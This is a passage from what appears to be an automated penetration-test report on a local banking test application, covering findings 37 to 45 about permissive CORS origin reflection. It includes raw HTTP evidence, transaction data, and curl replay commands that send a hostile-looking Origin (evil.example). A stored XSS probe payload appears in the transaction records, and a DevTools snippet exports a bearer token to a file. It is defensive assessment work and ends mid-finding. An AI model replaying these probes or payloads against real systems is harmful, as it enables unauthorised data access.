curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/admin/customers?page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user and copy the bearer token from the Authorization header in the browser DevTools Network request, then replay the request with Origin: https://evil.example.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 37. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-061
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an untrusted Origin value in Access-Control-Allow-Origin while also returning Access-Control-Allow-Credentials: true. The behavior applies to an endpoint returning transaction details.

### Impact
If authentication credentials are automatically available to a hostile origin, that origin may be able to read sensitive API responses in a victim's browser.

### Likelihood
The arbitrary-origin behavior is confirmed, but the probe did not demonstrate a browser sending usable victim credentials automatically. The tested request used an Authorization header and no cookies.

### Recommendation
Allow only explicitly trusted origins, reject null and unknown origins, and enable credentialed CORS only on endpoints that require it. Add browser-based tests for authenticated cross-origin requests.

### Evidence
```
A request with Origin: https://evil.example received HTTP 200 containing transaction data, Access-Control-Allow-Origin: https://evil.example, and Access-Control-Allow-Credentials: true.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:15:51 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 3725
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[{"id":43,"from_account_id":100,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"Payment to 062-001 10000001 (A07 validator near-no-op)","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":"REC-BOE-20260908-DC15DD18","original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:55:01","type":"credit"},{"id":42,"from_account_id":100,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"Payment to 062-001 10000001 (AESPA machine-token test)","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":"REC-BOE-20260908-825C78E6","original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:51:15","type":"credit"},{"id":39,"from_account_id":6,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"AESPA ownership test","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:45:56","type":"credit"},{"id":38,"from_account_id":1,"to_bsb":"000-000","to_account_number":"30000001","to_account_id":null,"amount":"0.01","description":"validation probe","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:39:27","type":"debit"},{"id":37,"from_account_id":1,"to_bsb":"000-000","to_account_number":"30000001","to_account_id":null,"amount":"0.01","description":"validation probe","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:38:40","type":"debit"},{"id":36,"from_account_id":1,"to_bsb":"062-001","to_account_number":"30000001","to_account_id":6,"amount":"0.01","description":"<img src=x onerror=\"document.body.dataset.xss009='1'\">","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:34:17","type":"debit"},{"id":3,"from_account_id":2,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"200.00","description":"Weekend spending","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-02-01 10:00:00","type":"credit"},{"id":2,"from_account_id":1,"to_bsb":"033-042","to_account_number":"56781234","to_account_id":null,"amount":"150.00","description":"Birthday gift Mum","transfer_type":"address_book","address_book_id":null,"totp_verified":true,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-20 14:30:00","type":"debit"},{"id":1,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"500.00","description":"Monthly savings","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-05 09:12:00","type":"debit"}],"pagination":{"current_page":1,"per_page":15,"total":9,"total_pages":1}},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:15:51 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 3725
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[{"id":43,"from_account_id":100,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"Payment to 062-001 10000001 (A07 validator near-no-op)","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":"REC-BOE-20260908-DC15DD18","original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:55:01","type":"credit"},{"id":42,"from_account_id":100,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"Payment to 062-001 10000001 (AESPA machine-token test)","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":"REC-BOE-20260908-825C78E6","original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:51:15","type":"credit"},{"id":39,"from_account_id":6,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"0.01","description":"AESPA ownership test","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:45:56","type":"credit"},{"id":38,"from_account_id":1,"to_bsb":"000-000","to_account_number":"30000001","to_account_id":null,"amount":"0.01","description":"validation probe","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:39:27","type":"debit"},{"id":37,"from_account_id":1,"to_bsb":"000-000","to_account_number":"30000001","to_account_id":null,"amount":"0.01","description":"validation probe","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:38:40","type":"debit"},{"id":36,"from_account_id":1,"to_bsb":"062-001","to_account_number":"30000001","to_account_id":6,"amount":"0.01","description":"<img src=x onerror=\"document.body.dataset.xss009='1'\">","transfer_type":"manual","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-09-08 12:34:17","type":"debit"},{"id":3,"from_account_id":2,"to_bsb":"062-001","to_account_number":"10000001","to_account_id":1,"amount":"200.00","description":"Weekend spending","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-02-01 10:00:00","type":"credit"},{"id":2,"from_account_id":1,"to_bsb":"033-042","to_account_number":"56781234","to_account_id":null,"amount":"150.00","description":"Birthday gift Mum","transfer_type":"address_book","address_book_id":null,"totp_verified":true,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-20 14:30:00","type":"debit"},{"id":1,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"500.00","description":"Monthly savings","transfer_type":"own","address_book_id":null,"totp_verified":false,"status":"completed","receipt_number":null,"original_currency":null,"original_amount":null,"exchange_rate":null,"created_at":"2026-01-05 09:12:00","type":"debit"}],"pagination":{"current_page":1,"per_page":15,"total":9,"total_pages":1}},"message":"OK"}
```

### Validation Note
The anonymous control request returned 401, so the transaction data is protected by Authorization. Using the listed admin_test session, the same request with Origin https://evil.example returned 200 transaction data and Access-Control-Allow-Origin: https://evil.example together with Access-Control-Allow-Credentials: true. The cookie-free bearer authentication limits exploitability compared with cookie auth, but it does not provide a benign explanation for the confirmed arbitrary-origin CORS policy on this authenticated data endpoint.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_test** or an equivalent user).

Log in as the admin_test user, then copy that user's bearer token from the Authorization header in the browser DevTools Network panel. Do not share the password.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 38. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-064
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an untrusted Origin value in Access-Control-Allow-Origin while also returning Access-Control-Allow-Credentials: true and allowing all request headers.

### Impact
A malicious site may be able to read API responses in a victim's browser if the application uses credentials that browsers attach cross-origin.

### Likelihood
Limited in the observed context because the request used an Authorization header and no cookies. No browser-based sensitive-data read was demonstrated.

### Recommendation
Use an explicit allowlist of trusted origins, reject unknown origins, disable credentialed CORS where unnecessary, and restrict allowed headers and methods.

### Evidence
```
A request containing Origin: https://evil.example received Access-Control-Allow-Origin: https://evil.example, Access-Control-Allow-Credentials: true, and Access-Control-Allow-Headers: *.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:17:14 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 132
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":999,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=51&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:17:14 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 132
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":999,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Validation Note
The exact endpoint reflects the arbitrary Origin https://evil.example and returns Access-Control-Allow-Credentials: true and Access-Control-Allow-Headers: *. This occurred on an anonymous 401, on an authenticated admin 200 response, and on a browser-style OPTIONS preflight accepting Authorization. The authenticated response was successful, so the behavior is not explained by an error handler or an unreachable protected route.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/transactions?account_id=51&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin test user, then copy the bearer value from the Authorization header in the browser DevTools Network panel and supply it when replaying the request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 39. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-068
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=8&page=999&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an untrusted Origin value and enables credentialed cross-origin requests.

### Impact
A malicious website may read API responses in a victim's browser if browser-managed credentials are used. The probes only demonstrated access to error responses, so sensitive data exposure was not confirmed.

### Likelihood
The policy is confirmed, but practical impact depends on whether sensitive endpoints use cookies or other credentials sent automatically by browsers.

### Recommendation
Allow only trusted origins, enable credentials only where required, restrict allowed methods and headers, and return Vary: Origin for dynamic policies.

### Evidence
```
A request with Origin: https://evil.example received Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=8&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 404
date: Tue, 08 Sep 2026 13:19:35 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 77
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"NOT_FOUND","message":"Account not found."}}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=8&page=999&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 404
date: Tue, 08 Sep 2026 13:19:35 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 77
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"NOT_FOUND","message":"Account not found."}}
```

### Validation Note
The initial evidence was ambiguous because it showed a 404 response and a wildcard ACAO value, but a direct anonymous replay confirmed the server changes ACAO to the supplied Origin. I then used the supplied admin session and a valid account on the same endpoint; the response was 200 and exposed transaction records, while still returning Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true. The preflight for an Authorization-bearing GET also returned 200 with the attacker origin, so the error-only and non-reflection explanations do not hold.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Accept: application/json' -H 'Origin: https://evil.example' 'http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user, then copy the Authorization bearer token from the browser DevTools Network request headers and provide it when replaying the PoC.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 40. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-070
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/accounts?page=1&per_page=20
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an untrusted Origin value and enables credentialed cross-origin requests.

### Impact
A malicious website may be able to read API responses when browser-managed credentials are accepted. Sensitive authenticated data access was not demonstrated.

### Likelihood
Limited in the observed context because the request was rejected with 401 and no cookies were present.

### Recommendation
Allow only trusted origins, disable credentialed CORS where unnecessary, and restrict allowed headers and methods.

### Evidence
```
A request with Origin: https://evil.example received Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true. The response was 401 Invalid token, so authenticated data exposure was not proven.

REQUEST:
GET http://localhost:8081/api/admin/accounts?page=1&per_page=20
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 401
date: Tue, 08 Sep 2026 13:22:33 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/accounts?page=1&per_page=20
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 401
date: Tue, 08 Sep 2026 13:22:33 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Validation Note
The anonymous request did not prove exposure, so I retried the same endpoint with the listed admin session and Origin https://evil.example. The server returned 200 with account records, including another user's email and financial account data, while returning Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true. This rules out the benign explanation that the headers only appeared on an unauthorized error; an arbitrary origin can make credentialed reads of the admin response.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/admin/accounts?page=1&per_page=20' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the listed admin user and copy the bearer token from the Authorization header or browser storage into the validator session.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 41. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-071
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=3&page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The transactions API reflects an attacker-controlled Origin value and enables credentialed cross-origin requests.

### Impact
A malicious site may be able to read API responses when a victim's browser automatically supplies valid credentials.

### Likelihood
Low in the observed context because the request used an Authorization header, which a malicious origin cannot automatically obtain or attach.

### Recommendation
Allow only trusted origins, disable credentialed CORS unless required, and restrict allowed methods and headers.

### Evidence
```
A request with Origin: https://evil.example received Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true.

REQUEST:
GET http://localhost:8081/api/transactions?account_id=3&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:28:06 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 130
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":1,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=3&page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:28:06 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 130
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":1,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Validation Note
The raw endpoint reflects the supplied Origin and returns Access-Control-Allow-Credentials: true. Anonymous access is rejected, but the listed admin_test session receives HTTP 200 and transaction records with the evil Origin, so a browser-controlled cross-origin request can read authenticated data. The reported account_id=3 response was empty, but that is only an empty fixture and does not explain away the same policy on the resource when account_id=1 contains records.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_test** or an equivalent user).

Log in as the admin_test user and copy its bearer token from the Authorization request header in the browser DevTools Network panel.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 42. Transaction API allows arbitrary CORS origins

- Finding reference: URBN-051
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=3&page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The transaction endpoint reflects an attacker-controlled Origin value in the Access-Control-Allow-Origin response header.

### Impact
A malicious website could read API responses through a victim's browser if the browser sends usable authentication with cross-origin requests. This weakens the same-origin boundary.

### Likelihood
Arbitrary origin reflection was reproduced using https://evil.example. Exploitation depends on whether the victim's browser supplies valid authentication and whether sensitive response data can be accessed. No cross-origin access to sensitive authenticated data was demonstrated.

### Recommendation
Configure an explicit allowlist of trusted application origins. Return Access-Control-Allow-Origin only when the request Origin matches an approved origin, and omit CORS headers for all other origins.

### Evidence
```
A GET request to the transaction endpoint with Origin: https://evil.example returned HTTP 200 and access-control-allow-origin: https://evil.example. The JSON response contained an empty transaction list and pagination data.
```

### Request Evidence
```
GET /api/transactions?account_id=3&page=1&per_page=15
Origin: https://evil.example
```

### Response Evidence
```
HTTP/1.1 200 OK
access-control-allow-origin: https://evil.example
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[],"pagination":{"current_page":1,"per_page":15,"total":0,"total_pages":0}},"message":"OK"}
```

### Validation Note
The endpoint reflected https://evil.example in Access-Control-Allow-Origin and also returned Access-Control-Allow-Credentials: true on an authenticated 200 response. A matching browser preflight for GET with the Authorization header also returned 200 and reflected the attacker origin, so direct-request or preflight enforcement does not provide an innocent explanation. Authentication uses an Authorization header rather than a cookie, which limits practical victim-session exploitation, but it does not disprove the reported arbitrary-origin CORS configuration.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -H 'Origin: https://evil.example' 'http://localhost:8081/api/transactions?account_id=3&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user and copy the bearer token from the Authorization request header in the browser Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 43. Admin customer API reflects arbitrary CORS origins

- Finding reference: URBN-046
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The authenticated admin customer endpoint reflects an attacker-controlled Origin header in the Access-Control-Allow-Origin response header while returning customer records.

### Impact
A malicious origin could potentially read sensitive admin API responses if browser-accessible authentication is accepted on cross-origin requests. This could expose customer names, email addresses, phone numbers, TOTP status, and account counts.

### Likelihood
Arbitrary origin reflection was reproduced consistently. Cross-origin access to authenticated data was not demonstrated in a browser, so practical exploitation depends on how authentication credentials are stored and sent.

### Recommendation
Configure Access-Control-Allow-Origin using an explicit allowlist of trusted admin origins. Do not reflect arbitrary Origin values, and disable credentialed cross-origin requests unless they are required.

### Evidence
```
An authorized GET request to /api/admin/customers?page=1&per_page=15 with Origin: https://evil.example returned HTTP 200, reflected https://evil.example in Access-Control-Allow-Origin, and returned a JSON customer list containing emails, names, phone numbers, TOTP status, and account counts.
```

### Request Evidence
```
Authorized GET /api/admin/customers?page=1&per_page=15 with Origin: https://evil.example.
```

### Response Evidence
```
HTTP 200 with Access-Control-Allow-Origin: https://evil.example and a JSON customer list.
```

### Validation Note
The reflected Origin header is real, but it does not expose an administrator's browser session. The supplied admin session authenticates with an explicit Authorization header and sends no cookies; the same cross-origin request without that header returned 401 with "Missing or invalid Authorization header" and no customer records. This is a bearer-token API allowing cross-origin clients, and an attacker-controlled web origin cannot make the browser attach the victim's Authorization token automatically.

## 44. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-038
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/profile
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The authenticated profile endpoint reflects an untrusted Origin value in the Access-Control-Allow-Origin response header.

### Impact
A malicious website could read sensitive profile data if the user's authentication material is available to cross-origin requests. The response also exposes customer contact details and password_hash values, increasing the sensitivity of successful exploitation.

### Likelihood
Origin reflection was reproduced with a valid test session. Browser-based cross-origin access was not demonstrated, so exploitation depends on how authentication tokens are stored and sent.

### Recommendation
Configure an explicit allowlist of trusted application origins and never reflect arbitrary Origin values. Disable cross-origin credential use unless it is required. Remove password_hash and other unnecessary sensitive fields from profile responses.

### Evidence
```
A GET request to /api/profile using a valid test session and Origin: https://evil.example returned HTTP 200 with Access-Control-Allow-Origin: https://evil.example. The response body contained the customer's email, address, phone, and password_hash.
```

### Request Evidence
```
GET /api/profile with a valid test session and Origin: https://evil.example.
```

### Response Evidence
```
HTTP 200, Access-Control-Allow-Origin: https://evil.example, and a profile body containing customer email, address, phone, and password_hash.
```

### Validation Note
The successful request used the `http_token` session, and the captured request evidence shows an Authorization header but no cookies. An unauthenticated request returned 401, so the API does not rely on an ambient browser credential that a hostile site can cause the browser to attach. The preflight also returned only `Access-Control-Allow-Headers: *`; Authorization is a CORS non-wildcard request header and must be named explicitly, so browser JavaScript cannot use this response to send the bearer token and read the profile. The raw HTTP client reproduced Origin reflection, but that does not create cross-origin profile disclosure for this header-token authentication flow.

## 45. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-065
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/payments/transfer
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an attacker-controlled Origin value and enables credentialed cross-origin requests.

### Impact
A malicious website may be able to read API responses when the victim uses browser-managed credentials accepted by the application.

### Likelihood
The CORS behavior is confirmed, but no sensitive authenticated response was shown as readable cross-origin.

### Recommendation
Allow only trusted origins, disable credentialed CORS where unnecessary, restrict allowed headers and methods, and test sensitive endpoints from an untrusted origin.

### Evidence
```
